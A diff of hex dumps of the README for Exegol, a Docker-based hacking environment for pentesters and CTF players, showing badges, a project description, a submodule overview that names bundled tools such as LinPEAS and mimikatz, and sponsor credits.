-00001020: 6564 206f 6e20 5b74 6865 206f 6666 6963  ed on [the offic
-00001030: 6961 6c20 446f 636b 6572 6875 6220 7265  ial Dockerhub re
-00001040: 6769 7374 7279 5d28 6874 7470 733a 2f2f  gistry](https://
-00001050: 6875 622e 646f 636b 6572 2e63 6f6d 2f72  hub.docker.com/r
-00001060: 6570 6f73 6974 6f72 792f 646f 636b 6572  epository/docker
-00001070: 2f6e 776f 6474 7568 732f 6578 6567 6f6c  /nwodtuhs/exegol
-00001080: 292e 0a2d 2054 6865 205b 4578 6567 6f6c  )..- The [Exegol
-00001090: 2d72 6573 6f75 7263 6573 5d28 6874 7470  -resources](http
-000010a0: 733a 2f2f 6769 7468 7562 2e63 6f6d 2f54  s://github.com/T
-000010b0: 6865 506f 7267 732f 4578 6567 6f6c 2d72  hePorgs/Exegol-r
-000010c0: 6573 6f75 7263 6573 2920 7265 706f 2069  esources) repo i
-000010d0: 7320 6c6f 6164 6564 2061 7320 6120 7375  s loaded as a su
-000010e0: 626d 6f64 756c 652e 2049 7420 696e 636c  bmodule. It incl
-000010f0: 7564 6573 2061 6c6c 2072 6573 6f75 7263  udes all resourc
-00001100: 6573 206d 656e 7469 6f6e 6564 2070 7265  es mentioned pre
-00001110: 7669 6f75 736c 7920 284c 696e 5045 4153  viously (LinPEAS
-00001120: 2c20 5769 6e50 4541 532c 204c 696e 456e  , WinPEAS, LinEn
-00001130: 756d 2c20 5072 6976 6573 6343 6865 636b  um, PrivescCheck
-00001140: 2c20 5379 7369 6e74 6572 6e61 6c73 5375  , SysinternalsSu
-00001150: 6974 652c 206d 696d 696b 6174 7a2c 2052  ite, mimikatz, R
-00001160: 7562 6575 732c 2050 6f77 6572 5370 6c6f  ubeus, PowerSplo
-00001170: 6974 2061 6e64 206d 616e 7920 6d6f 7265  it and many more
-00001180: 2e29 2e0a 2d20 5468 6520 5b45 7865 676f  .)..- The [Exego
-00001190: 6c2d 646f 6373 5d28 6874 7470 733a 2f2f  l-docs](https://
-000011a0: 6769 7468 7562 2e63 6f6d 2f54 6865 506f  github.com/ThePo
-000011b0: 7267 732f 4578 6567 6f6c 2d64 6f63 7329  rgs/Exegol-docs)
-000011c0: 2072 6570 6f20 666f 7220 7468 6520 646f   repo for the do
-000011d0: 6375 6d65 6e74 6174 696f 6e2c 2064 6573  cumentation, des
-000011e0: 7469 6e65 6420 666f 7220 7573 6572 7320  tined for users 
-000011f0: 6173 2077 656c 6c20 6173 2064 6576 656c  as well as devel
-00001200: 6f70 7065 7273 2061 6e64 2063 6f6e 7472  oppers and contr
-00001210: 6962 7574 6f72 732e 2054 6865 2047 6974  ibutors. The Git
-00001220: 4875 6220 7265 706f 2068 6f6c 6473 2074  Hub repo holds t
-00001230: 6865 2073 6f75 7263 6573 2074 6861 7420  he sources that 
-00001240: 6172 6520 636f 6d70 696c 6564 206f 6e20  are compiled on 
-00001250: 6874 7470 733a 2f2f 6578 6567 6f6c 2e72  https://exegol.r
-00001260: 6561 6474 6865 646f 6373 2e69 6f2f 2e0a  eadthedocs.io/..
-00001270: 0a23 2053 706f 6e73 6f72 730a 0a3c 6469  .# Sponsors..<di
-00001280: 7620 616c 6967 6e3d 2263 656e 7465 7222  v align="center"
-00001290: 3e0a 2020 3c61 2068 7265 663d 2268 7474  >.  <a href="htt
-000012a0: 7073 3a2f 2f77 7777 2e63 6170 6765 6d69  ps://www.capgemi
-000012b0: 6e69 2e63 6f6d 2f22 2074 6974 6c65 3d22  ni.com/" title="
-000012c0: 466f 6c6c 6f77 223e 0a20 2020 203c 696d  Follow">.    <im
-000012d0: 6720 7769 6474 683d 2233 3030 2220 7372  g width="300" sr
-000012e0: 633d 2268 7474 7073 3a2f 2f75 706c 6f61  c="https://uploa
-000012f0: 642e 7769 6b69 6d65 6469 612e 6f72 672f  d.wikimedia.org/
-00001300: 7769 6b69 7065 6469 612f 6672 2f74 6875  wikipedia/fr/thu
-00001310: 6d62 2f62 2f62 352f 4361 7067 656d 696e  mb/b/b5/Capgemin
-00001320: 695f 4c6f 676f 2e73 7667 2f31 3238 3070  i_Logo.svg/1280p
-00001330: 782d 4361 7067 656d 696e 695f 4c6f 676f  x-Capgemini_Logo
-00001340: 2e73 7667 2e70 6e67 223e 0a20 203c 2f61  .svg.png">.  </a
-00001350: 3e0a 3c2f 6469 763e 0a0a 4472 616d 656c  >.</div>..Dramel
-00001360: 6163 2061 6e64 2049 2077 6f72 6b20 6174  ac and I work at
-00001370: 202a 4361 7067 656d 696e 692a 2061 6e64   *Capgemini* and
-00001380: 2077 6520 7468 616e 6b20 7468 656d 2066   we thank them f
-00001390: 6f72 2061 6c6c 6f63 6174 696e 6720 736f  or allocating so
-000013a0: 6d65 2074 696d 6520 666f 7220 7573 2074  me time for us t
-000013b0: 6f20 6465 7665 6c6f 7020 616e 6420 6d61  o develop and ma
-000013c0: 696e 7461 696e 2045 7865 676f 6c21 2056  intain Exegol! V
-000013d0: 6973 6974 2043 6170 6765 6d69 6e69 2077  isit Capgemini w
-000013e0: 6562 7369 7465 2061 7420 6874 7470 733a  ebsite at https:
-000013f0: 2f2f 7777 772e 6361 7067 656d 696e 692e  //www.capgemini.
-00001400: 636f 6d2f 2e0a 0a5f 5f5f 0a0a 3c64 6976  com/...___..<div
-00001410: 2061 6c69 676e 3d22 6365 6e74 6572 223e   align="center">
-00001420: 0a20 203c 6120 6872 6566 3d22 6874 7470  .  <a href="http
-00001430: 733a 2f2f 7777 772e 6861 636b 7468 6562  s://www.hacktheb
-00001440: 6f78 2e63 6f6d 2f22 2074 6974 6c65 3d22  ox.com/" title="
-00001450: 466f 6c6c 6f77 223e 0a20 2020 203c 696d  Follow">.    <im
-00001460: 6720 7769 6474 683d 2233 3030 2220 7372  g width="300" sr
-00001470: 633d 2268 7474 7073 3a2f 2f65 7865 676f  c="https://exego
-00001480: 6c2e 7265 6164 7468 6564 6f63 732e 696f  l.readthedocs.io
-00001490: 2f65 6e2f 6c61 7465 7374 2f5f 696d 6167  /en/latest/_imag
-000014a0: 6573 2f68 6163 6b74 6865 626f 782e 706e  es/hackthebox.pn
-000014b0: 6722 3e0a 2020 3c2f 613e 0a3c 2f64 6976  g">.  </a>.</div
-000014c0: 3e0a 0a57 6520 616c 736f 2074 6861 6e6b  >..We also thank
-000014d0: 202a 4861 636b 5468 6542 6f78 2a20 666f   *HackTheBox* fo
-000014e0: 7220 636f 6e74 696e 756f 7573 6c79 2073  r continuously s
-000014f0: 7570 706f 7274 696e 6720 7468 6520 636f  upporting the co
-00001500: 6d6d 756e 6974 7920 616e 6420 666f 7220  mmunity and for 
-00001510: 6865 6c70 696e 6720 7573 2066 696e 616e  helping us finan
-00001520: 6369 616c 6c79 2074 6f20 6163 7175 6972  cially to acquir
-00001530: 6520 7468 6520 6e65 6365 7373 6172 7920  e the necessary 
-00001540: 6861 7264 7761 7265 2066 6f72 2073 7570  hardware for sup
-00001550: 706f 7274 696e 6720 6d75 6c74 6970 6c65  porting multiple
-00001560: 2061 7263 6869 7465 6374 7572 6573 2028   architectures (
-00001570: 414d 4436 342c 2041 524d 3634 292e 2053  AMD64, ARM64). S
-00001580: 686f 7720 736f 6d65 206c 6f76 6520 6174  how some love at
-00001590: 2068 7474 7073 3a2f 2f77 7777 2e68 6163   https://www.hac
-000015a0: 6b74 6865 626f 782e 636f 6d2f 2021 0a0a  kthebox.com/ !..
+00000000: 3c64 6976 2061 6c69 676e 3d22 6365 6e74  <div align="cent
+00000010: 6572 223e 0a20 203c 696d 6720 616c 743d  er">.  <img alt=
+00000020: 226c 6174 6573 7420 636f 6d6d 6974 206f  "latest commit o
+00000030: 6e20 6d61 7374 6572 2220 7769 6474 683d  n master" width=
+00000040: 2236 3030 2220 7372 633d 2268 7474 7073  "600" src="https
+00000050: 3a2f 2f72 6177 2e67 6974 6875 6275 7365  ://raw.githubuse
+00000060: 7263 6f6e 7465 6e74 2e63 6f6d 2f54 6865  rcontent.com/The
+00000070: 506f 7267 732f 4578 6567 6f6c 2d64 6f63  Porgs/Exegol-doc
+00000080: 732f 6d61 696e 2f2e 6173 7365 7473 2f72  s/main/.assets/r
+00000090: 6f75 6e64 6564 5f73 6f63 6961 6c5f 7072  ounded_social_pr
+000000a0: 6576 6965 772e 706e 6722 3e0a 2020 3c62  eview.png">.  <b
+000000b0: 723e 3c62 723e 0a20 203c 6120 7461 7267  r><br>.  <a targ
+000000c0: 6574 3d22 5f62 6c61 6e6b 2220 7265 6c3d  et="_blank" rel=
+000000d0: 226e 6f6f 7065 6e65 7220 6e6f 7265 6665  "noopener norefe
+000000e0: 7272 6572 2220 6872 6566 3d22 6874 7470  rrer" href="http
+000000f0: 733a 2f2f 7079 7069 2e6f 7267 2f70 726f  s://pypi.org/pro
+00000100: 6a65 6374 2f45 7865 676f 6c22 2074 6974  ject/Exegol" tit
+00000110: 6c65 3d22 223e 3c69 6d67 2073 7263 3d22  le=""><img src="
+00000120: 6874 7470 733a 2f2f 696d 672e 7368 6965  https://img.shie
+00000130: 6c64 732e 696f 2f70 7970 692f 762f 4578  lds.io/pypi/v/Ex
+00000140: 6567 6f6c 3f63 6f6c 6f72 3d69 6e66 6f72  egol?color=infor
+00000150: 6d61 7469 6f6e 616c 2220 616c 743d 2270  mational" alt="p
+00000160: 6970 2070 6163 6b61 6765 2076 6572 7369  ip package versi
+00000170: 6f6e 223e 3c2f 613e 0a20 203c 696d 6720  on"></a>.  <img 
+00000180: 616c 743d 2250 7974 686f 6e33 2e37 2220  alt="Python3.7" 
+00000190: 7372 633d 2268 7474 7073 3a2f 2f69 6d67  src="https://img
+000001a0: 2e73 6869 656c 6473 2e69 6f2f 6261 6467  .shields.io/badg
+000001b0: 652f 5079 7468 6f6e 2d33 2e37 2b2d 696e  e/Python-3.7+-in
+000001c0: 666f 726d 6174 696f 6e61 6c22 3e0a 2020  formational">.  
+000001d0: 3c61 2074 6172 6765 743d 225f 626c 616e  <a target="_blan
+000001e0: 6b22 2072 656c 3d22 6e6f 6f70 656e 6572  k" rel="noopener
+000001f0: 206e 6f72 6566 6572 7265 7222 2068 7265   noreferrer" hre
+00000200: 663d 2268 7474 7073 3a2f 2f70 6570 792e  f="https://pepy.
+00000210: 7465 6368 2f70 726f 6a65 6374 2f65 7865  tech/project/exe
+00000220: 676f 6c22 2074 6974 6c65 3d22 223e 3c69  gol" title=""><i
+00000230: 6d67 2073 7263 3d22 6874 7470 733a 2f2f  mg src="https://
+00000240: 7374 6174 6963 2e70 6570 792e 7465 6368  static.pepy.tech
+00000250: 2f70 6572 736f 6e61 6c69 7a65 642d 6261  /personalized-ba
+00000260: 6467 652f 6578 6567 6f6c 3f70 6572 696f  dge/exegol?perio
+00000270: 643d 746f 7461 6c26 756e 6974 733d 696e  d=total&units=in
+00000280: 7465 726e 6174 696f 6e61 6c5f 7379 7374  ternational_syst
+00000290: 656d 266c 6566 745f 636f 6c6f 723d 6772  em&left_color=gr
+000002a0: 6579 2672 6967 6874 5f63 6f6c 6f72 3d62  ey&right_color=b
+000002b0: 7269 6768 7467 7265 656e 266c 6566 745f  rightgreen&left_
+000002c0: 7465 7874 3d44 6f77 6e6c 6f61 6473 2220  text=Downloads" 
+000002d0: 616c 743d 2270 6970 2073 7461 7473 223e  alt="pip stats">
+000002e0: 3c2f 613e 0a20 203c 6272 3e3c 6272 3e0a  </a>.  <br><br>.
+000002f0: 2020 3c69 6d67 2061 6c74 3d22 6c61 7465    <img alt="late
+00000300: 7374 2063 6f6d 6d69 7420 6f6e 206d 6173  st commit on mas
+00000310: 7465 7222 2073 7263 3d22 6874 7470 733a  ter" src="https:
+00000320: 2f2f 696d 672e 7368 6965 6c64 732e 696f  //img.shields.io
+00000330: 2f67 6974 6875 622f 6c61 7374 2d63 6f6d  /github/last-com
+00000340: 6d69 742f 5468 6550 6f72 6773 2f45 7865  mit/ThePorgs/Exe
+00000350: 676f 6c2f 6d61 7374 6572 3f6c 6162 656c  gol/master?label
+00000360: 3d6c 6174 6573 7425 3230 7265 6c65 6173  =latest%20releas
+00000370: 6522 3e0a 2020 3c69 6d67 2061 6c74 3d22  e">.  <img alt="
+00000380: 6c61 7465 7374 2063 6f6d 6d69 7420 6f6e  latest commit on
+00000390: 2064 6576 2220 7372 633d 2268 7474 7073   dev" src="https
+000003a0: 3a2f 2f69 6d67 2e73 6869 656c 6473 2e69  ://img.shields.i
+000003b0: 6f2f 6769 7468 7562 2f6c 6173 742d 636f  o/github/last-co
+000003c0: 6d6d 6974 2f54 6865 506f 7267 732f 4578  mmit/ThePorgs/Ex
+000003d0: 6567 6f6c 2f64 6576 3f6c 6162 656c 3d6c  egol/dev?label=l
+000003e0: 6174 6573 7425 3230 6465 7622 3e0a 2020  atest%20dev">.  
+000003f0: 3c62 723e 3c62 723e 0a20 203c 696d 6720  <br><br>.  <img 
+00000400: 616c 743d 2263 7572 7265 6e74 2076 6572  alt="current ver
+00000410: 7369 6f6e 2220 7372 633d 2268 7474 7073  sion" src="https
+00000420: 3a2f 2f69 6d67 2e73 6869 656c 6473 2e69  ://img.shields.i
+00000430: 6f2f 6261 6467 652f 6c69 6e75 782d 7375  o/badge/linux-su
+00000440: 7070 6f72 7465 642d 7375 6363 6573 7322  pported-success"
+00000450: 3e0a 2020 3c69 6d67 2061 6c74 3d22 6375  >.  <img alt="cu
+00000460: 7272 656e 7420 7665 7273 696f 6e22 2073  rrent version" s
+00000470: 7263 3d22 6874 7470 733a 2f2f 696d 672e  rc="https://img.
+00000480: 7368 6965 6c64 732e 696f 2f62 6164 6765  shields.io/badge
+00000490: 2f77 696e 646f 7773 2d73 7570 706f 7274  /windows-support
+000004a0: 6564 2d73 7563 6365 7373 223e 0a20 203c  ed-success">.  <
+000004b0: 696d 6720 616c 743d 2263 7572 7265 6e74  img alt="current
+000004c0: 2076 6572 7369 6f6e 2220 7372 633d 2268   version" src="h
+000004d0: 7474 7073 3a2f 2f69 6d67 2e73 6869 656c  ttps://img.shiel
+000004e0: 6473 2e69 6f2f 6261 6467 652f 6d61 632d  ds.io/badge/mac-
+000004f0: 7375 7070 6f72 7465 642d 7375 6363 6573  supported-succes
+00000500: 7322 3e0a 2020 3c62 723e 0a20 203c 696d  s">.  <br>.  <im
+00000510: 6720 616c 743d 2261 6d64 3634 2220 7372  g alt="amd64" sr
+00000520: 633d 2268 7474 7073 3a2f 2f69 6d67 2e73  c="https://img.s
+00000530: 6869 656c 6473 2e69 6f2f 6261 6467 652f  hields.io/badge/
+00000540: 616d 6436 3425 3230 2878 3836 5f5f 3634  amd64%20(x86__64
+00000550: 292d 7375 7070 6f72 7465 642d 7375 6363  )-supported-succ
+00000560: 6573 7322 3e0a 2020 3c69 6d67 2061 6c74  ess">.  <img alt
+00000570: 3d22 6172 6d36 3422 2073 7263 3d22 6874  ="arm64" src="ht
+00000580: 7470 733a 2f2f 696d 672e 7368 6965 6c64  tps://img.shield
+00000590: 732e 696f 2f62 6164 6765 2f61 726d 3634  s.io/badge/arm64
+000005a0: 2532 3028 6161 7263 6836 3429 2d73 7570  %20(aarch64)-sup
+000005b0: 706f 7274 6564 2d73 7563 6365 7373 223e  ported-success">
+000005c0: 0a20 203c 6272 3e3c 6272 3e0a 2020 3c61  .  <br><br>.  <a
+000005d0: 2074 6172 6765 743d 225f 626c 616e 6b22   target="_blank"
+000005e0: 2072 656c 3d22 6e6f 6f70 656e 6572 206e   rel="noopener n
+000005f0: 6f72 6566 6572 7265 7222 2068 7265 663d  oreferrer" href=
+00000600: 2268 7474 7073 3a2f 2f74 7769 7474 6572  "https://twitter
+00000610: 2e63 6f6d 2f69 6e74 656e 742f 666f 6c6c  .com/intent/foll
+00000620: 6f77 3f73 6372 6565 6e5f 6e61 6d65 3d5f  ow?screen_name=_
+00000630: 6e77 6f64 7475 6873 2220 7469 746c 653d  nwodtuhs" title=
+00000640: 2246 6f6c 6c6f 7722 3e3c 696d 6720 7372  "Follow"><img sr
+00000650: 633d 2268 7474 7073 3a2f 2f69 6d67 2e73  c="https://img.s
+00000660: 6869 656c 6473 2e69 6f2f 7477 6974 7465  hields.io/twitte
+00000670: 722f 666f 6c6c 6f77 2f5f 6e77 6f64 7475  r/follow/_nwodtu
+00000680: 6873 3f6c 6162 656c 3d53 6875 7464 6f77  hs?label=Shutdow
+00000690: 6e26 7374 796c 653d 736f 6369 616c 2220  n&style=social" 
+000006a0: 616c 743d 2254 7769 7474 6572 2053 6875  alt="Twitter Shu
+000006b0: 7464 6f77 6e22 3e3c 2f61 3e0a 2020 3c61  tdown"></a>.  <a
+000006c0: 2074 6172 6765 743d 225f 626c 616e 6b22   target="_blank"
+000006d0: 2072 656c 3d22 6e6f 6f70 656e 6572 206e   rel="noopener n
+000006e0: 6f72 6566 6572 7265 7222 2068 7265 663d  oreferrer" href=
+000006f0: 2268 7474 7073 3a2f 2f74 7769 7474 6572  "https://twitter
+00000700: 2e63 6f6d 2f69 6e74 656e 742f 666f 6c6c  .com/intent/foll
+00000710: 6f77 3f73 6372 6565 6e5f 6e61 6d65 3d44  ow?screen_name=D
+00000720: 7261 6d65 6c61 635f 2220 7469 746c 653d  ramelac_" title=
+00000730: 2246 6f6c 6c6f 7722 3e3c 696d 6720 7372  "Follow"><img sr
+00000740: 633d 2268 7474 7073 3a2f 2f69 6d67 2e73  c="https://img.s
+00000750: 6869 656c 6473 2e69 6f2f 7477 6974 7465  hields.io/twitte
+00000760: 722f 666f 6c6c 6f77 2f44 7261 6d65 6c61  r/follow/Dramela
+00000770: 635f 3f6c 6162 656c 3d44 7261 6d65 6c61  c_?label=Dramela
+00000780: 6326 7374 796c 653d 736f 6369 616c 2220  c&style=social" 
+00000790: 616c 743d 2254 7769 7474 6572 2044 7261  alt="Twitter Dra
+000007a0: 6d65 6c61 6322 3e3c 2f61 3e0a 2020 3c62  melac"></a>.  <b
+000007b0: 723e 0a20 203c 6120 7461 7267 6574 3d22  r>.  <a target="
+000007c0: 5f62 6c61 6e6b 2220 7265 6c3d 226e 6f6f  _blank" rel="noo
+000007d0: 7065 6e65 7220 6e6f 7265 6665 7272 6572  pener noreferrer
+000007e0: 2220 6872 6566 3d22 6874 7470 733a 2f2f  " href="https://
+000007f0: 7777 772e 626c 6163 6b68 6174 2e63 6f6d  www.blackhat.com
+00000800: 2f65 752d 3232 2f61 7273 656e 616c 2f73  /eu-22/arsenal/s
+00000810: 6368 6564 756c 652f 696e 6465 782e 6874  chedule/index.ht
+00000820: 6d6c 2365 7865 676f 6c2d 3239 3138 3022  ml#exegol-29180"
+00000830: 2074 6974 6c65 3d22 5363 6865 6475 6c65   title="Schedule
+00000840: 223e 0a20 2020 3c69 6d67 2061 6c74 3d22  ">.   <img alt="
+00000850: 426c 6163 6b20 4861 7420 4575 726f 7065  Black Hat Europe
+00000860: 2032 3032 3222 2073 7263 3d22 6874 7470   2022" src="http
+00000870: 733a 2f2f 696d 672e 7368 6965 6c64 732e  s://img.shields.
+00000880: 696f 2f62 6164 6765 2f42 6c61 636b 2532  io/badge/Black%2
+00000890: 3048 6174 2532 3041 7273 656e 616c 2d45  0Hat%20Arsenal-E
+000008a0: 7572 6f70 6525 3230 3230 3232 2d62 6c75  urope%202022-blu
+000008b0: 6576 696f 6c65 7422 3e0a 2020 3c2f 613e  eviolet">.  </a>
+000008c0: 0a20 203c 6120 7461 7267 6574 3d22 5f62  .  <a target="_b
+000008d0: 6c61 6e6b 2220 7265 6c3d 226e 6f6f 7065  lank" rel="noope
+000008e0: 6e65 7220 6e6f 7265 6665 7272 6572 2220  ner noreferrer" 
+000008f0: 6872 6566 3d22 6874 7470 733a 2f2f 7777  href="https://ww
+00000900: 772e 626c 6163 6b68 6174 2e63 6f6d 2f61  w.blackhat.com/a
+00000910: 7369 612d 3233 2f61 7273 656e 616c 2f73  sia-23/arsenal/s
+00000920: 6368 6564 756c 652f 2365 7865 676f 6c2d  chedule/#exegol-
+00000930: 7072 6f66 6573 7369 6f6e 616c 2d68 6163  professional-hac
+00000940: 6b69 6e67 2d73 6574 7570 2d33 3038 3135  king-setup-30815
+00000950: 2220 7469 746c 653d 2253 6368 6564 756c  " title="Schedul
+00000960: 6522 3e0a 2020 203c 696d 6720 616c 743d  e">.   <img alt=
+00000970: 2242 6c61 636b 2048 6174 2041 7369 6120  "Black Hat Asia 
+00000980: 3230 3233 2220 7372 633d 2268 7474 7073  2023" src="https
+00000990: 3a2f 2f69 6d67 2e73 6869 656c 6473 2e69  ://img.shields.i
+000009a0: 6f2f 6261 6467 652f 426c 6163 6b25 3230  o/badge/Black%20
+000009b0: 4861 7425 3230 4172 7365 6e61 6c2d 4173  Hat%20Arsenal-As
+000009c0: 6961 2532 3032 3032 332d 626c 7565 7669  ia%202023-bluevi
+000009d0: 6f6c 6574 223e 0a20 203c 2f61 3e0a 2020  olet">.  </a>.  
+000009e0: 3c62 723e 3c62 723e 0a20 203c 6120 7461  <br><br>.  <a ta
+000009f0: 7267 6574 3d22 5f62 6c61 6e6b 2220 7265  rget="_blank" re
+00000a00: 6c3d 226e 6f6f 7065 6e65 7220 6e6f 7265  l="noopener nore
+00000a10: 6665 7272 6572 2220 6872 6566 3d22 6874  ferrer" href="ht
+00000a20: 7470 733a 2f2f 6469 7363 6f72 642e 6767  tps://discord.gg
+00000a30: 2f63 5854 6879 7037 4436 5022 2074 6974  /cXThyp7D6P" tit
+00000a40: 6c65 3d22 4a6f 696e 2075 7320 6f6e 2044  le="Join us on D
+00000a50: 6973 636f 7264 223e 3c69 6d67 2073 7263  iscord"><img src
+00000a60: 3d22 6874 7470 733a 2f2f 7261 772e 6769  ="https://raw.gi
+00000a70: 7468 7562 7573 6572 636f 6e74 656e 742e  thubusercontent.
+00000a80: 636f 6d2f 5468 6550 6f72 6773 2f45 7865  com/ThePorgs/Exe
+00000a90: 676f 6c2d 646f 6373 2f6d 6169 6e2f 2e61  gol-docs/main/.a
+00000aa0: 7373 6574 732f 6469 7363 6f72 645f 6a6f  ssets/discord_jo
+00000ab0: 696e 5f75 732e 706e 6722 2077 6964 7468  in_us.png" width
+00000ac0: 3d22 3135 3022 2061 6c74 3d22 4a6f 696e  ="150" alt="Join
+00000ad0: 2075 7320 6f6e 2044 6973 636f 7264 223e   us on Discord">
+00000ae0: 3c2f 613e 0a20 203c 6272 3e3c 6272 3e0a  </a>.  <br><br>.
+00000af0: 3c2f 6469 763e 0a0a 3e20 4578 6567 6f6c  </div>..> Exegol
+00000b00: 2069 7320 6120 636f 6d6d 756e 6974 792d   is a community-
+00000b10: 6472 6976 656e 2068 6163 6b69 6e67 2065  driven hacking e
+00000b20: 6e76 6972 6f6e 6d65 6e74 2c20 706f 7765  nvironment, powe
+00000b30: 7266 756c 2061 6e64 2079 6574 2073 696d  rful and yet sim
+00000b40: 706c 6520 656e 6f75 6768 2074 6f20 6265  ple enough to be
+00000b50: 2075 7365 6420 6279 2061 6e79 6f6e 6520   used by anyone 
+00000b60: 696e 2064 6179 2074 6f20 6461 7920 656e  in day to day en
+00000b70: 6761 6765 6d65 6e74 732e 2045 7865 676f  gagements. Exego
+00000b80: 6c20 6973 2074 6865 2062 6573 7420 736f  l is the best so
+00000b90: 6c75 7469 6f6e 2074 6f20 6465 706c 6f79  lution to deploy
+00000ba0: 2070 6f77 6572 6675 6c20 6861 636b 696e   powerful hackin
+00000bb0: 6720 656e 7669 726f 6e6d 656e 7473 2073  g environments s
+00000bc0: 6563 7572 656c 792c 2065 6173 696c 792c  ecurely, easily,
+00000bd0: 2070 726f 6665 7373 696f 6e61 6c6c 792e   professionally.
+00000be0: 0a3e 2045 7865 676f 6c20 6669 7473 2070  .> Exegol fits p
+00000bf0: 656e 7465 7374 6572 732c 2043 5446 2070  entesters, CTF p
+00000c00: 6c61 7965 7273 2c20 6275 6720 626f 756e  layers, bug boun
+00000c10: 7479 2068 756e 7465 7273 2c20 7265 7365  ty hunters, rese
+00000c20: 6172 6368 6572 732c 2062 6567 696e 6e65  archers, beginne
+00000c30: 7273 2061 6e64 2061 6476 616e 6365 6420  rs and advanced 
+00000c40: 7573 6572 732c 2064 6566 656e 6465 7273  users, defenders
+00000c50: 2c20 6672 6f6d 2073 7479 6c69 7368 206d  , from stylish m
+00000c60: 6163 4f53 2075 7365 7273 2061 6e64 2063  acOS users and c
+00000c70: 6f72 706f 7261 7465 2057 696e 646f 7773  orporate Windows
+00000c80: 2070 726f 7320 746f 2055 4e49 582d 6c69   pros to UNIX-li
+00000c90: 6b65 2070 6f77 6572 2075 7365 7273 2e0a  ke power users..
+00000ca0: 0a23 2047 6574 7469 6e67 2073 7461 7274  .# Getting start
+00000cb0: 6564 0a0a 596f 7520 6361 6e20 7265 6665  ed..You can refe
+00000cc0: 7220 746f 2074 6865 205b 4578 6567 6f6c  r to the [Exegol
+00000cd0: 2064 6f63 756d 656e 7461 7469 6f6e 735d   documentations]
+00000ce0: 2868 7474 7073 3a2f 2f65 7865 676f 6c2e  (https://exegol.
+00000cf0: 7265 6164 7468 6564 6f63 732e 696f 2f65  readthedocs.io/e
+00000d00: 6e2f 6c61 7465 7374 2f67 6574 7469 6e67  n/latest/getting
+00000d10: 2d73 7461 7274 6564 2f69 6e73 7461 6c6c  -started/install
+00000d20: 2e68 746d 6c29 2e0a 0a3e 2046 756c 6c20  .html)...> Full 
+00000d30: 646f 6375 6d65 6e74 6174 696f 6e20 686f  documentation ho
+00000d40: 6d65 7061 6765 3a20 6874 7470 733a 2f2f  mepage: https://
+00000d50: 6578 6567 6f6c 2e72 7466 642e 696f 2f2e  exegol.rtfd.io/.
+00000d60: 0a0a 2323 2050 726f 6a65 6374 2073 7472  ..## Project str
+00000d70: 7563 7475 7265 0a0a 4265 6c6f 7720 6172  ucture..Below ar
+00000d80: 6520 736f 6d65 2062 756c 6c65 7420 706f  e some bullet po
+00000d90: 696e 7473 2074 6f20 6265 7474 6572 2075  ints to better u
+00000da0: 6e64 6572 7374 616e 6420 686f 7720 4578  nderstand how Ex
+00000db0: 6567 6f6c 2077 6f72 6b73 0a2d 2054 6869  egol works.- Thi
+00000dc0: 7320 7265 706f 7369 746f 7279 2028 5b45  s repository ([E
+00000dd0: 7865 676f 6c5d 2868 7474 7073 3a2f 2f67  xegol](https://g
+00000de0: 6974 6875 622e 636f 6d2f 5468 6550 6f72  ithub.com/ThePor
+00000df0: 6773 2f45 7865 676f 6c29 2920 636f 6e74  gs/Exegol)) cont
+00000e00: 6169 6e73 2074 6865 2063 6f64 6520 666f  ains the code fo
+00000e10: 7220 7468 6520 5079 7468 6f6e 2077 7261  r the Python wra
+00000e20: 7070 6572 2e20 4974 2773 2074 6865 2065  pper. It's the e
+00000e30: 6e74 7279 706f 696e 7420 6f66 2074 6865  ntrypoint of the
+00000e40: 2045 7865 676f 6c20 7072 6f6a 6563 742e   Exegol project.
+00000e50: 2054 6865 2077 7261 7070 6572 2063 616e   The wrapper can
+00000e60: 2062 6520 696e 7374 616c 6c65 6420 6672   be installed fr
+00000e70: 6f6d 2073 6f75 7263 6573 2c20 6275 7420  om sources, but 
+00000e80: 5b61 2050 7950 4920 7061 636b 6167 655d  [a PyPI package]
+00000e90: 2868 7474 7073 3a2f 2f70 7970 692e 6f72  (https://pypi.or
+00000ea0: 672f 7072 6f6a 6563 742f 4578 6567 6f6c  g/project/Exegol
+00000eb0: 2f29 2069 7320 6176 6169 6c61 626c 652e  /) is available.
+00000ec0: 0a2d 2054 6865 205b 4578 6567 6f6c 2d69  .- The [Exegol-i
+00000ed0: 6d61 6765 735d 2868 7474 7073 3a2f 2f67  mages](https://g
+00000ee0: 6974 6875 622e 636f 6d2f 5468 6550 6f72  ithub.com/ThePor
+00000ef0: 6773 2f45 7865 676f 6c2d 696d 6167 6573  gs/Exegol-images
+00000f00: 2920 7265 706f 2069 7320 6c6f 6164 6564  ) repo is loaded
+00000f10: 2061 7320 6120 7375 626d 6f64 756c 652e   as a submodule.
+00000f20: 2049 7420 696e 636c 7564 6573 2061 6c6c   It includes all
+00000f30: 206e 6563 6573 7361 7279 2061 7373 6574   necessary asset
+00000f40: 7320 746f 2062 7569 6c64 2044 6f63 6b65  s to build Docke
+00000f50: 7220 696d 6167 6573 2e20 4e6f 7461 6265  r images. Notabe
+00000f60: 6e65 3a20 7468 6520 696d 6167 6520 6172  ne: the image ar
+00000f70: 6520 616c 7265 6164 7920 6275 696c 7420  e already built 
+00000f80: 616e 6420 6f66 6665 7265 6420 6f6e 205b  and offered on [
+00000f90: 7468 6520 6f66 6669 6369 616c 2044 6f63  the official Doc
+00000fa0: 6b65 7268 7562 2072 6567 6973 7472 795d  kerhub registry]
+00000fb0: 2868 7474 7073 3a2f 2f68 7562 2e64 6f63  (https://hub.doc
+00000fc0: 6b65 722e 636f 6d2f 7265 706f 7369 746f  ker.com/reposito
+00000fd0: 7279 2f64 6f63 6b65 722f 6e77 6f64 7475  ry/docker/nwodtu
+00000fe0: 6873 2f65 7865 676f 6c29 2e0a 2d20 5468  hs/exegol)..- Th
+00000ff0: 6520 5b45 7865 676f 6c2d 7265 736f 7572  e [Exegol-resour
+00001000: 6365 735d 2868 7474 7073 3a2f 2f67 6974  ces](https://git
+00001010: 6875 622e 636f 6d2f 5468 6550 6f72 6773  hub.com/ThePorgs
+00001020: 2f45 7865 676f 6c2d 7265 736f 7572 6365  /Exegol-resource
+00001030: 7329 2072 6570 6f20 6973 206c 6f61 6465  s) repo is loade
+00001040: 6420 6173 2061 2073 7562 6d6f 6475 6c65  d as a submodule
+00001050: 2e20 4974 2069 6e63 6c75 6465 7320 616c  . It includes al
+00001060: 6c20 7265 736f 7572 6365 7320 6d65 6e74  l resources ment
+00001070: 696f 6e65 6420 7072 6576 696f 7573 6c79  ioned previously
